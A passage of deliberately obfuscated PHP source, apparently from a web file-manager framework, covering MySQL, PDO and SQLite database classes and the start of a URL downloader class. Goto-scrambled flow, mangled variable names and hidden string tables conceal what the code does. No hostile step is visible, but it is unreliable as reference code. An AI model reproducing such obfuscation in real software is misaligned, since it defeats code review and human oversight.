$bÛğ»ÃÎ°ä[815] . $this->parseTable($föß´À±‰÷[$bÛğ»ÃÎ°ä[264]]) . $bÛğ»ÃÎ°ä[809] . implode($bÛğ»ÃÎ°ä[47], $cßòâŞ‘°) . $bÛğ»ÃÎ°ä[816] . implode($bÛğ»ÃÎ°ä[47], $b‘‰İ‘õê”); return $this->execute($B˜í£‰äš×); goto B»®ÈÄ; B»®ÈÄ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $cÜÏ´ÊÙºå =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->error = $this->_linkID->errno . $cÜÏ´ÊÙºå[4] . $this->_linkID->error; if ($cÜÏ´ÊÙºå[33] != $this->queryStr) { $this->error .= LNG($cÜÏ´ÊÙºå[45]) . $this->queryStr; } think_trace($this->error, $cÜÏ´ÊÙºå[33], $cÜÏ´ÊÙºå[46]); return $this->error; } public function escapeString($eÄ×µ¤¯±) { if ($this->_linkID) { return $this->_linkID->real_escape_string($eÄ×µ¤¯±); } else { return addslashes($eÄ×µ¤¯±); } } public function parseKey(&$dëã¡–Ñï‚, $d‹ ÍÃ´ = true) { $B‡‰¯ºËÖÆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($d‹ ÍÃ´) { $dëã¡–Ñï‚ = $this->parseKeyCheck($dëã¡–Ñï‚); } if ($dëã¡–Ñï‚ != $B‡‰¯ºËÖÆ[173] && !preg_match($B‡‰¯ºËÖÆ[817], $dëã¡–Ñï‚)) { $dëã¡–Ñï‚ = $B‡‰¯ºËÖÆ[818] . trim($dëã¡–Ñï‚, $B‡‰¯ºËÖÆ[818]) . $B‡‰¯ºËÖÆ[818]; } return $dëã¡–Ñï‚; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($d½¶Ç¾õÅ’ = '') { $DÓ²ó›ƒ­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!class_exists($DÓ²ó›ƒ­[820])) { think_exception(think_lang($DÓ²ó›ƒ­[10]) . $DÓ²ó›ƒ­[821]); } if (!empty($d½¶Ç¾õÅ’)) { $this->config = $d½¶Ç¾õÅ’; if (empty($this->config[$DÓ²ó›ƒ­[13]])) { $this->config[$DÓ²ó›ƒ­[13]] = array(); } } } public function connect($Aì¬¿½›®È = '', $D—òÊŞ—˜£ = 0) { $FŒÕ…–Ø÷× =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset($this->linkID[$D—òÊŞ—˜£])) { goto fÉ–¯‡‹; DË“Ó½Øáì: $this->linkID[$D—òÊŞ—˜£]->exec($FŒÕ…–Ø÷×[831] . think_config($FŒÕ…–Ø÷×[798])); $this->connected = !0; if (1 != think_config($FŒÕ…–Ø÷×[18])) { unset($this->config); } goto B‹†±çïìõ; EÜ‹•ˆ’†Ş: $this->dbType = $this->_getDsnType($Aì¬¿½›®È[$FŒÕ…–Ø÷×[822]]); if (in_array($this->dbType, array($FŒÕ…–Ø÷×[823], $FŒÕ…–Ø÷×[824], $FŒÕ…–Ø÷×[825], $FŒÕ…–Ø÷×[826]))) { think_exception($FŒÕ…–Ø÷×[827] . $this->dbType . $FŒÕ…–Ø÷×[828] . $this->dbType . $FŒÕ…–Ø÷×[829]); } if (!$this->linkID[$D—òÊŞ—˜£]) { think_exception($FŒÕ…–Ø÷×[830]); } goto DË“Ó½Øáì; fÉ–¯‡‹: if (empty($Aì¬¿½›®È)) { $Aì¬¿½›®È = $this->config; } if ($this->pconnect) { $Aì¬¿½›®È[$FŒÕ…–Ø÷×[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$D—òÊŞ—˜£] = new PDO($Aì¬¿½›®È[$FŒÕ…–Ø÷×[822]], $Aì¬¿½›®È[$FŒÕ…–Ø÷×[795]], $Aì¬¿½›®È[$FŒÕ…–Ø÷×[796]], $Aì¬¿½›®È[$FŒÕ…–Ø÷×[13]]); } catch (PDOException $f‚ˆÙ¼²ßÌ) { think_exception($f‚ˆÙ¼²ßÌ->getMessage()); } goto EÜ‹•ˆ’†Ş; B‹†±çïìõ: } return $this->linkID[$D—òÊŞ—˜£]; } public function free() { $this->PDOStatement = null; } public function query($c©’ˆÕéÌì, $A—Û¤óÎÙ¼ = array()) { goto C¥ç¬œ¦ï; c…¦»•¨á: $this->queryStr = $c©’ˆÕéÌì; if (!empty($A—Û¤óÎÙ¼)) { $this->queryStr .= $A²ë¢¬·¡À[832] . print_r($A—Û¤óÎÙ¼, !0) . $A²ë¢¬·¡À[833]; } if (!empty($this->PDOStatement)) { $this->free(); } goto F÷Ì¯ğ­Ïá; C¥ç¬œ¦ï: $A²ë¢¬·¡À =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c…¦»•¨á; cÄË‘ÜŠæ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Aµ×—«ÏŒ£ = $this->PDOStatement->execute($A—Û¤óÎÙ¼); $this->debug(); goto b…‰®×‰¤Ø; F÷Ì¯ğ­Ïá: think_action_status($A²ë¢¬·¡À[19], 1); think_status($A²ë¢¬·¡À[20]); $this->PDOStatement = $this->_linkID->prepare($c©’ˆÕéÌì); goto cÄË‘ÜŠæ; b…‰®×‰¤Ø: if (!1 === $Aµ×—«ÏŒ£) { $this->error(); return !1; } else { return $this->getAll(); } goto FÅŠ†µÕ•ñ; FÅŠ†µÕ•ñ: } public function execute($Bùõ‚‡™Ş×, $f‚¬êÊÅÖÌ = array()) { goto bÌÒŠ•ß‘; E„¶ÕÈîÈä: $this->queryStr = $Bùõ‚‡™Ş×; if (!empty($f‚¬êÊÅÖÌ)) { $this->queryStr .= $AÄÔÖ§‰ˆ[832] . print_r($f‚¬êÊÅÖÌ, !0) . $AÄÔÖ§‰ˆ[833]; } $c½÷«ÂÔÈ¶ = !1; goto f”ËŸ×µâÌ; f”ËŸ×µâÌ: if ($this->dbType == $AÄÔÖ§‰ˆ[826]) { if (preg_match($AÄÔÖ§‰ˆ[834], $this->queryStr, $e½æ¼áÚ•)) { $this->table = think_config($AÄÔÖ§‰ˆ[835]) . str_ireplace(think_config($AÄÔÖ§‰ˆ[836]), $AÄÔÖ§‰ˆ[358], $e½æ¼áÚ•[2]); $c½÷«ÂÔÈ¶ = (bool) $this->query($AÄÔÖ§‰ˆ[837] . strtoupper($this->table) . $AÄÔÖ§‰ˆ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($AÄÔÖ§‰ˆ[21], 1); goto fÍ‹¢›Ùà¸; bÌÒŠ•ß‘: $AÄÔÖ§‰ˆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E„¶ÕÈîÈä; fÍ‹¢›Ùà¸: think_status($AÄÔÖ§‰ˆ[20]); $this->PDOStatement = $this->_linkID->prepare($Bùõ‚‡™Ş×); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto cœº˜¸ùåË; cœº˜¸ùåË: $F‘ôÒÆ¯™Š = $this->PDOStatement->execute($f‚¬êÊÅÖÌ); $this->debug(); if (!1 === $F‘ôÒÆ¯™Š) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($c½÷«ÂÔÈ¶ || preg_match($AÄÔÖ§‰ˆ[838], $Bùõ‚‡™Ş×)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto A‰ÜËˆ‚®; A‰ÜËˆ‚®: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dˆÄ“Æ¸ÂŸ = $this->_linkID->commit(); $this->transTimes = 0; if (!$dˆÄ“Æ¸ÂŸ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $CåâÅÙ„ó = $this->_linkID->rollback(); $this->transTimes = 0; if (!$CåâÅÙ„ó) { $this->error(); return !1; } } return !0; } private function getAll() { $BÁ¥¾ŠĞéÁ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($BÁ¥¾ŠĞéÁ); return $BÁ¥¾ŠĞéÁ; } public function getFields($A°ï¸‚) { goto Eæ¢‚Şè½; f…êÎºèŒ: return $FÍÅ½âø¥; goto aÆ©Üè˜„Æ; fâ½¿  ‚Ğ: $DÆÈÚôÍ¼ = $this->query($EÍÍÕè¢¦¤); $FÍÅ½âø¥ = array(); if ($DÆÈÚôÍ¼) { foreach ($DÆÈÚôÍ¼ as $f¦´½•©Œ” => $AÈ¿¾áöÍ) { $AÈ¿¾áöÍ = array_change_key_case($AÈ¿¾áöÍ); $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[28]] = isset($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[28]]) ? $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[28]] : $eêÑ©À¤¤¨[358]; $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[29]] = isset($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[29]]) ? $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[29]] : $eêÑ©À¤¤¨[358]; $D‹ë¶‹‘ø = isset($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[258]]) ? $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[258]] : $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[28]]; $FÍÅ½âø¥[$D‹ë¶‹‘ø] = array($eêÑ©À¤¤¨[28] => $D‹ë¶‹‘ø, $eêÑ©À¤¤¨[29] => $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[29]], $eêÑ©À¤¤¨[31] => (bool) (isset($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[101]]) && $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[101]] === $eêÑ©À¤¤¨[33] || isset($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[31]]) && $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[31]] === $eêÑ©À¤¤¨[33]), $eêÑ©À¤¤¨[34] => isset($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[34]]) ? $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[34]] : (isset($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[53]]) ? $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[53]] : $eêÑ©À¤¤¨[358]), $eêÑ©À¤¤¨[36] => isset($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[89]]) ? strtolower($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[89]]) == $eêÑ©À¤¤¨[38] : (isset($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[54]]) ? $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[54]] : !1), $eêÑ©À¤¤¨[39] => isset($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[855]]) ? strtolower($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[855]]) == $eêÑ©À¤¤¨[41] : (isset($AÈ¿¾áöÍ[$eêÑ©À¤¤¨[89]]) ? $AÈ¿¾áöÍ[$eêÑ©À¤¤¨[89]] : !1)); } } goto f…êÎºèŒ; Eæ¢‚Şè½: $eêÑ©À¤¤¨ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->initConnect(!0); if (think_config($eêÑ©À¤¤¨[839])) { $EÍÍÕè¢¦¤ = str_replace($eêÑ©À¤¤¨[840], $A°ï¸‚, think_config($eêÑ©À¤¤¨[839])); } else { switch ($this->dbType) { case $eêÑ©À¤¤¨[823]: case $eêÑ©À¤¤¨[841]: $EÍÍÕè¢¦¤ = "\x53\105\114\x45\103\x54\x20\x20\x20\143\157\154\x75\x6d\x6e\137\x6e\141\155\x65\40\141\x73\40\x27\116\141\x6d\145\47\x2c\x20\40\40\x64\x61\x74\141\x5f\x74\x79\x70\145\x20\x61\163\x20\47\x54\171\x70\145\47\54\x20\40\x20\143\157\154\x75\155\156\137\x64\145\x66\x61\x75\154\164\x20\141\x73\x20\x27\x44\x65\146\141\x75\x6c\164\x27\x2c\40\x20\40\151\x73\x5f\156\165\x6c\x6c\141\x62\154\x65\40\x61\163\x20\x27\x4e\165\x6c\154\x27\xa\11\11\x46\x52\x4f\x4d\x9\151\x6e\146\157\x72\155\x61\164\151\157\156\137\163\143\x68\145\155\x61\x2e\164\141\142\154\x65\163\x20\101\123\x20\164\12\x9\11\x4a\117\x49\116\x9\151\x6e\146\157\x72\x6d\x61\164\x69\x6f\x6e\x5f\x73\x63\x68\x65\155\x61\56\143\157\154\x75\x6d\156\x73\40\101\123\x20\143\12\x9\x9\117\x4e\40\40\x74\56\164\x61\x62\x6c\x65\x5f\x63\x61\x74\141\154\x6f\147\40\75\x20\143\x2e\164\x61\x62\x6c\x65\137\143\141\x74\x61\x6c\157\x67\12\x9\11\101\x4e\104\x20\164\56\x74\141\142\x6c\x65\x5f\x73\x63\x68\145\155\x61\40\75\40\143\56\164\141\x62\154\x65\x5f\x73\143\150\x65\155\141\12\x9\11\x41\116\104\x20\164\x2e\x74\x61\x62\154\145\x5f\x6e\141\155\x65\x20\x3d\x20\143\x2e\164\x61\x62\154\x65\137\x6e\x61\x6d\145\12\11\11\127\110\105\x52\x45\40\x20\x20\164\x2e\x74\141\142\x6c\x65\x5f\x6e\141\155\145\40\75\x20\47{$A°ï¸‚}\47"; break; case $eêÑ©À¤¤¨[842]: $EÍÍÕè¢¦¤ = $eêÑ©À¤¤¨[843] . $A°ï¸‚ . $eêÑ©À¤¤¨[844]; break; case $eêÑ©À¤¤¨[824]: case $eêÑ©À¤¤¨[826]: $EÍÍÕè¢¦¤ = $eêÑ©À¤¤¨[845] . $eêÑ©À¤¤¨[846] . $eêÑ©À¤¤¨[847] . strtoupper($A°ï¸‚) . $eêÑ©À¤¤¨[848] . strtoupper($A°ï¸‚) . $eêÑ©À¤¤¨[849]; break; case $eêÑ©À¤¤¨[850]: $EÍÍÕè¢¦¤ = $eêÑ©À¤¤¨[851] . $A°ï¸‚ . $eêÑ©À¤¤¨[852]; break; case $eêÑ©À¤¤¨[825]: break; case $eêÑ©À¤¤¨[853]: default: $EÍÍÕè¢¦¤ = $eêÑ©À¤¤¨[854] . ($this->dbType == $eêÑ©À¤¤¨[853] ? "\x60{$A°ï¸‚}\x60" : $A°ï¸‚); } } goto fâ½¿  ‚Ğ; aÆ©Üè˜„Æ: } public function getTables($cõ›‡ ªÙô = '') { $fùùà›Ÿƒµ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (think_config($fùùà›Ÿƒµ[856])) { $c»Ëæ¹÷° = str_replace($fùùà›Ÿƒµ[857], $cõ›‡ ªÙô, think_config($fùùà›Ÿƒµ[856])); } else { switch ($this->dbType) { case $fùùà›Ÿƒµ[824]: case $fùùà›Ÿƒµ[826]: $c»Ëæ¹÷° = $fùùà›Ÿƒµ[858]; break; case $fùùà›Ÿƒµ[823]: case $fùùà›Ÿƒµ[841]: $c»Ëæ¹÷° = $fùùà›Ÿƒµ[859]; break; case $fùùà›Ÿƒµ[850]: $c»Ëæ¹÷° = $fùùà›Ÿƒµ[860]; break; case $fùùà›Ÿƒµ[825]: think_exception(think_lang($fùùà›Ÿƒµ[861]) . $fùùà›Ÿƒµ[862]); break; case $fùùà›Ÿƒµ[842]: $c»Ëæ¹÷° = $fùùà›Ÿƒµ[42] . $fùùà›Ÿƒµ[43] . $fùùà›Ÿƒµ[44]; break; case $fùùà›Ÿƒµ[853]: default: if (!empty($cõ›‡ ªÙô)) { $c»Ëæ¹÷° = $fùùà›Ÿƒµ[806] . $cõ›‡ ªÙô; } else { $c»Ëæ¹÷° = $fùùà›Ÿƒµ[807]; } } } $dŒÆ¤ˆØ¼Ü = $this->query($c»Ëæ¹÷°); $FÀ’¦ Ş™Ò = array(); foreach ($dŒÆ¤ˆØ¼Ü as $cªëŒ«áéï => $aéêÕ·Ñïö) { $FÀ’¦ Ş™Ò[$cªëŒ«áéï] = current($aéêÕ·Ñïö); } return $FÀ’¦ Ş™Ò; } protected function parseLimit($A•‚»ùŠî) { $dÌ“÷ç··œ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B…Ö‡ç…³ç = $dÌ“÷ç··œ[33]; if (!empty($A•‚»ùŠî)) { switch ($this->dbType) { case $dÌ“÷ç··œ[850]: case $dÌ“÷ç··œ[842]: $A•‚»ùŠî = explode($dÌ“÷ç··œ[47], $A•‚»ùŠî); if (count($A•‚»ùŠî) > 1) { $B…Ö‡ç…³ç .= $dÌ“÷ç··œ[48] . $A•‚»ùŠî[1] . $dÌ“÷ç··œ[49] . $A•‚»ùŠî[0] . $dÌ“÷ç··œ[50]; } else { $B…Ö‡ç…³ç .= $dÌ“÷ç··œ[48] . $A•‚»ùŠî[0] . $dÌ“÷ç··œ[50]; } break; case $dÌ“÷ç··œ[823]: case $dÌ“÷ç··œ[841]: break; case $dÌ“÷ç··œ[825]: break; case $dÌ“÷ç··œ[824]: case $dÌ“÷ç··œ[826]: break; case $dÌ“÷ç··œ[853]: default: $B…Ö‡ç…³ç .= $dÌ“÷ç··œ[48] . $A•‚»ùŠî . $dÌ“÷ç··œ[50]; } } return $B…Ö‡ç…³ç; } public function parseKey(&$Aõã¯À©µ‰, $E¨Ø“©…÷“ = true) { $a‡ô•ù‘ë— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($E¨Ø“©…÷“) { $Aõã¯À©µ‰ = $this->parseKeyCheck($Aõã¯À©µ‰); } if ($this->dbType == $a‡ô•ù‘ë—[853]) { if ($Aõã¯À©µ‰ != $a‡ô•ù‘ë—[173] && !preg_match($a‡ô•ù‘ë—[817], $Aõã¯À©µ‰)) { $Aõã¯À©µ‰ = $a‡ô•ù‘ë—[818] . trim($Aõã¯À©µ‰, $a‡ô•ù‘ë—[818]) . $a‡ô•ù‘ë—[818]; } return $Aõã¯À©µ‰; } else { return parent::parseKey($Aõã¯À©µ‰); } } public function close() { $this->_linkID = null; } public function error() { $eºÎ‹ŠˆñÍ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($this->PDOStatement) { $DÊäºŠÏòÔ = $this->PDOStatement->errorInfo(); $this->error = $DÊäºŠÏòÔ[1] . $eºÎ‹ŠˆñÍ[4] . $DÊäºŠÏòÔ[2]; } else { $this->error = $eºÎ‹ŠˆñÍ[33]; } if ($eºÎ‹ŠˆñÍ[33] != $this->queryStr) { $this->error .= LNG($eºÎ‹ŠˆñÍ[45]) . $this->queryStr; } think_trace($this->error, $eºÎ‹ŠˆñÍ[33], $eºÎ‹ŠˆñÍ[46]); return $this->error; } public function escapeString($A´Û¡èÖÏÇ) { $C¶§ƒÕù² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; switch ($this->dbType) { case $C¶§ƒÕù²[850]: case $C¶§ƒÕù²[823]: case $C¶§ƒÕù²[841]: case $C¶§ƒÕù²[853]: return addslashes($A´Û¡èÖÏÇ); case $C¶§ƒÕù²[825]: case $C¶§ƒÕù²[842]: case $C¶§ƒÕù²[824]: case $C¶§ƒÕù²[826]: return str_ireplace($C¶§ƒÕù²[55], $C¶§ƒÕù²[56], $A´Û¡èÖÏÇ); } } protected function parseValue($b¹İÅ‘×›§) { $CÀÄÎ—ëœ† =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_string($b¹İÅ‘×›§)) { $b¹İÅ‘×›§ = strpos($b¹İÅ‘×›§, $CÀÄÎ—ëœ†[4]) === 0 ? $this->escapeString($b¹İÅ‘×›§) : $CÀÄÎ—ëœ†[863] . $this->escapeString($b¹İÅ‘×›§) . $CÀÄÎ—ëœ†[863]; } elseif (isset($b¹İÅ‘×›§[0]) && is_string($b¹İÅ‘×›§[0]) && strtolower($b¹İÅ‘×›§[0]) == $CÀÄÎ—ëœ†[282]) { $b¹İÅ‘×›§ = $this->escapeString($b¹İÅ‘×›§[1]); } elseif (is_array($b¹İÅ‘×›§)) { $b¹İÅ‘×›§ = array_map(array($this, $CÀÄÎ—ëœ†[864]), $b¹İÅ‘×›§); } elseif (is_bool($b¹İÅ‘×›§)) { $b¹İÅ‘×›§ = $b¹İÅ‘×›§ ? $CÀÄÎ—ëœ†[83] : $CÀÄÎ—ëœ†[464]; } elseif (is_null($b¹İÅ‘×›§)) { $b¹İÅ‘×›§ = $CÀÄÎ—ëœ†[101]; } return $b¹İÅ‘×›§; } public function getLastInsertId() { $dÑÏ£âñî¬ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; switch ($this->dbType) { case $dÑÏ£âñî¬[850]: case $dÑÏ£âñî¬[842]: case $dÑÏ£âñî¬[823]: case $dÑÏ£âñî¬[841]: case $dÑÏ£âñî¬[825]: case $dÑÏ£âñî¬[853]: return $this->_linkID->lastInsertId(); case $dÑÏ£âñî¬[824]: case $dÑÏ£âñî¬[826]: $aí¼½İ‰„‡ = $this->table; $fØ¦ë×Şá = $this->query("\123\x45\x4c\105\103\x54\x20{$aí¼½İ‰„‡}\x2e\x63\x75\x72\162\x76\x61\154\x20\143\x75\x72\162\x76\141\154\x20\x46\x52\x4f\x4d\40\144\165\x61\x6c"); return $fØ¦ë×Şá ? $fØ¦ë×Şá[0][$dÑÏ£âñî¬[865]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($EÚ¬ÓåÂï) { goto f¼·ÀÙî‚›; f¼·ÀÙî‚›: $A²ÙÖ¥õŠ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bò±¢Ä¤¹ = DATA_PATH . $A²ÙÖ¥õŠ[866]; $aïğĞ©¶÷¤ = fopen($bò±¢Ä¤¹, $A²ÙÖ¥õŠ[867]); goto b›—¶É²ƒ´; b›—¶É²ƒ´: if (!$aïğĞ©¶÷¤) { return !1; } if (flock($aïğĞ©¶÷¤, LOCK_EX)) { $CŒœçŒáñ = parent::query($EÚ¬ÓåÂï); flock($aïğĞ©¶÷¤, LOCK_UN); fclose($aïğĞ©¶÷¤); return $CŒœçŒáñ; } flock($aïğĞ©¶÷¤, LOCK_UN); goto bä§‚¸Ì‹Ä; bä§‚¸Ì‹Ä: fclose($aïğĞ©¶÷¤); show_json($A²ÙÖ¥õŠ[868], !1); return !1; goto bÅòÆ¬±¿¯; bÅòÆ¬±¿¯: } public function execute($cààÓ°àØÑ) { goto EÍàƒÜ²â¯; EÍàƒÜ²â¯: $F‘·É¶ùÍ¥ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bÄÂÚæ•¸É = DATA_PATH . $F‘·É¶ùÍ¥[866]; $bÙÛšƒÕÅ = fopen($bÄÂÚæ•¸É, $F‘·É¶ùÍ¥[867]); goto bõÅŠŠ“Ğİ; eø®´˜ìÚÉ: fclose($bÙÛšƒÕÅ); show_json($F‘·É¶ùÍ¥[868], !1); return !1; goto Fæ¿Ô†ô²à; bõÅŠŠ“Ğİ: if (!$bÙÛšƒÕÅ) { return !1; } if (flock($bÙÛšƒÕÅ, LOCK_EX)) { $a÷íã‚ˆ‚… = parent::execute($cààÓ°àØÑ); flock($bÙÛšƒÕÅ, LOCK_UN); fclose($bÙÛšƒÕÅ); return $a÷íã‚ˆ‚…; } flock($bÙÛšƒÕÅ, LOCK_UN); goto eø®´˜ìÚÉ; Fæ¿Ô†ô²à: } } goto f„ÏÜ¶Û­Ñ; F›§í•–›æ: class Downloader { static function start($Aº®Æ£èÀÌ, $a¶Šøêƒä, $Dšš¦˜ÊÙ¼ = 10) { goto F£ªã“Œ±; Bò·ÈÌæ…†: if (!$Aº®Æ£èÀÌ) { return array($c¼ˆØ©™„¡[1024] => !1, $c¼ˆØ©™„¡[1026] => $c¼ˆØ©™„¡[1029]); } if (!$f…µ‰¦Åˆ¼[$c¼ˆØ©™„¡[1276]] || $f…µ‰¦Åˆ¼[$c¼ˆØ©™„¡[322]] == 0) { @unlink($f†ĞÕ Ÿ¶¡); @unlink($a¶Šøêƒä); $F£‘Ûè¬• = self::fileDownloadFopen($Aº®Æ£èÀÌ, $a¶Šøêƒä, $f…µ‰¦Åˆ¼[$c¼ˆØ©™„¡[322]]); if ($F£‘Ûè¬•[$c¼ˆØ©™„¡[1024]]) { return $F£‘Ûè¬•; } else { @unlink($f†ĞÕ Ÿ¶¡); @unlink($a¶Šøêƒä); $F£‘Ûè¬• = self::fileDownloadCurl($Aº®Æ£èÀÌ, $a¶Šøêƒä, !1, 0, $f…µ‰¦Åˆ¼[$c¼ˆØ©™„¡[322]]); @unlink($f†ĞÕ Ÿ¶¡); return $F£‘Ûè¬•; } } $fæ•…à•· = is_file($f†ĞÕ Ÿ¶¡) ? filesize($f†ĞÕ Ÿ¶¡) : 0; goto AíğéÕœÆ˜; cë“†ø”ˆ¹: $f†ĞÕ Ÿ¶¡ = $a¶Šøêƒä . $c¼ˆØ©™„¡[1483]; if (is_array($Aº®Æ£èÀÌ)) { $f…µ‰¦Åˆ¼ = $Aº®Æ£èÀÌ; } else { $f…µ‰¦Åˆ¼ = url_header($Aº®Æ£èÀÌ); } $Aº®Æ£èÀÌ = $f…µ‰¦Åˆ¼[$c¼ˆØ©™„¡[292]]; goto Bò·ÈÌæ…†; A¦Á—äŒ’: if ($fæ•…à•· > $AĞ…¤Òîõç) { @unlink($f†ĞÕ Ÿ¶¡); } file_put_contents($d¹í§æ»ãÙ, json_encode($d£«„äíØè)); $F£‘Ûè¬• = self::fileDownloadCurl($Aº®Æ£èÀÌ, $a¶Šøêƒä, !0, $fæ•…à•·, $AĞ…¤Òîõç); goto AÔİ¡¥œ¬‰; Dº³¶™ë¦Á: if (is_file($d¹í§æ»ãÙ)) { $Eğ²­ĞÎÔ– = file_get_contents($d¹í§æ»ãÙ); $d£«„äíØè = json_decode($Eğ²­ĞÎÔ–, 1); } if (file_exists($a¶Šøêƒä) && $AĞ…¤Òîõç == filesize($a¶Šøêƒä)) { @unlink($f†ĞÕ Ÿ¶¡); @unlink($d¹í§æ»ãÙ); return array($c¼ˆØ©™„¡[1024] => !0, $c¼ˆØ©™„¡[1026] => $c¼ˆØ©™„¡[1485]); } if ($d£«„äíØè[$c¼ˆØ©™„¡[322]] != $AĞ…¤Òîõç) { $d£«„äíØè = array($c¼ˆØ©™„¡[322] => $AĞ…¤Òîõç); } goto A¦Á—äŒ’; F£ªã“Œ±: $c¼ˆØ©™„¡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!request_url_safe($Aº®Æ£èÀÌ)) { return array($c¼ˆØ©™„¡[1024] => !1, $c¼ˆØ©™„¡[1026] => $c¼ˆØ©™„¡[1029]); } $d¹í§æ»ãÙ = $a¶Šøêƒä . $c¼ˆØ©™„¡[1482]; goto cë“†ø”ˆ¹; AÔİ¡¥œ¬‰: if ($F£‘Ûè¬•[$c¼ˆØ©™„¡[1024]]) { @unlink($d¹í§æ»ãÙ); } return $F£‘Ûè¬•; goto CÑæŞ­ÈâÚ; AíğéÕœÆ˜: $AĞ…¤Òîõç = intval($f…µ‰¦Åˆ¼[$c¼ˆØ©™„¡[322]]); if (file_exists($f†ĞÕ Ÿ¶¡) && time() - filemtime($f†ĞÕ Ÿ¶¡) < 3) { return array($c¼ˆØ©™„¡[1024] => !1, $c¼ˆØ©™„¡[1026] => $c¼ˆØ©™„¡[1484]); } $d£«„äíØè = array(); goto Dº³¶™ë¦Á; CÑæŞ­ÈâÚ: } static function fileDownloadFopen($c„¹ëŞğ‰«, $bãä˜µàñ, $eô»‰æÔô® = 0) { $A‘÷´ä«å´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; @ini_set($A‘÷´ä«å´[1486], $A‘÷´ä«å´[1487]); $a‚µôåâ×« = $bãä˜µàñ . $A‘÷´ä«å´[1483]; set_timeout(); @unlink($a‚µôåâ×«); if ($Fä †–£Ñ = @fopen($c„¹ëŞğ‰«, $A‘÷´ä«å´[1488])) { goto Dø«‰…ÇôÜ; Dø«‰…ÇôÜ: if (!($f†Ä¤éĞÍ = @fopen($a‚µôåâ×«, $A‘÷´ä«å´[1489]))) { return array($A‘÷´ä«å´[1024] => !1, $A‘÷´ä«å´[1026] => $A‘÷´ä«å´[1490]); } while (!feof($Fä †–£Ñ)) { if (!file_exists($a‚µôåâ×«)) { fclose($f†Ä¤éĞÍ); return array($A‘÷´ä«å´[1024] => !1, $A‘÷´ä«å´[1026] => $A‘÷´ä«å´[1491]); } clearstatcache(); if ($eô»‰æÔô® > 0 && $eô»‰æÔô® == filesize(iconv_system($a‚µôåâ×«))) { break; } fwrite($f†Ä¤éĞÍ, fread($Fä †–£Ñ, 1024 * 8), 1024 * 8); } fclose($f†Ä¤éĞÍ); goto F·¢Â’†É; F·¢Â’†É: fclose($Fä †–£Ñ); $f‡ŞçÂ»è = filesize(iconv_system($a‚µôåâ×«)); if ($eô»‰æÔô® != 0 && $f‡ŞçÂ»è != $eô»‰æÔô®) { return array($A‘÷´ä«å´[1024] => !1, $A‘÷´ä«å´[1026] => $A‘÷´ä«å´[1492]); } goto C‹œšá‚†à; C‹œšá‚†à: self::checkGzip($a‚µôåâ×«); if (!@rename($a‚µôåâ×«, $bãä˜µàñ)) { usleep(round(rand(0, 1000) * 50)); @unlink($bãä˜µàñ); $B„®½òİ—› = @rename($a‚µôåâ×«, $bãä˜µàñ); if (!$B„®½òİ—›) { return array($A‘÷´ä«å´[1024] => !1, $A‘÷´ä«å´[1026] => $A‘÷´ä«å´[1493]); } } return array($A‘÷´ä«å´[1024] => !0, $A‘÷´ä«å´[1026] => $A‘÷´ä«å´[691]); goto eå£à¹Åé; eå£à¹Åé: } else { return array($A‘÷´ä«å´[1024] => !1, $A‘÷´ä«å´[1026] => $A‘÷´ä«å´[1494]); } } static function fileDownloadCurl($f¥èÌİâÉ‚, 